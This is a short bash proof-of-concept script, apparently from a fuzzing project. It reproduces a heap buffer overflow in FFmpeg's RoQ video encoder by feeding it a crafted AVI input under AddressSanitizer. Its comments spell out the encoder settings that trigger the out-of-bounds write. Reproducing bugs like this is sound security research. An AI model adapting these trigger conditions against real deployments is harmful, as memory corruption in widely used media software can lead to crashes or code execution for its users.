#!/usr/bin/env bash
# PoC runner for VULN-001: Heap Buffer Overflow in roqvideoenc.c
# roq_encode_frame() size formula omits the RoQ_QUAD_CODEBOOK header and RoQ_INFO chunk.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "[*] Generating crafted AVI input..."
python3 vuln_001_gen.py vuln_001_input.avi

echo "[*] Running ffmpeg with ASAN to encode to RoQ..."
# -q:v 0.009 sets global_quality=1 -> frame->quality=1 -> lambda=0 in the encoder.
# With lambda=0, the rate-distortion optimizer chooses minimum-distortion mode;
# since CB2/CCC always has <= distortion than CB4/SLD, all blocks use CCC mode.
# -quake3_compat 0 disables the 65535-byte per-frame size limit, allowing 512x512
# all-CCC encoding to produce 70656 bytes of frame data; combined with the missing
# 8+16=24 bytes in the allocation formula, this triggers the heap buffer overflow.
ASAN_OPTIONS="abort_on_error=0:log_path=${SCRIPT_DIR}/asan.log" \
    /data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg \
    -y \
    -i vuln_001_input.avi \
    -c:v roqvideo \
    -q:v 0.009 \
    -quake3_compat 0 \
    vuln_001_output.roq \
    > vuln_001_result.txt 2>&1 || true

echo "[*] Collecting ASAN output..."
cat "${SCRIPT_DIR}"/asan.log.* >> vuln_001_result.txt 2>/dev/null || true

echo "[*] Done. Results in vuln_001_result.txt"
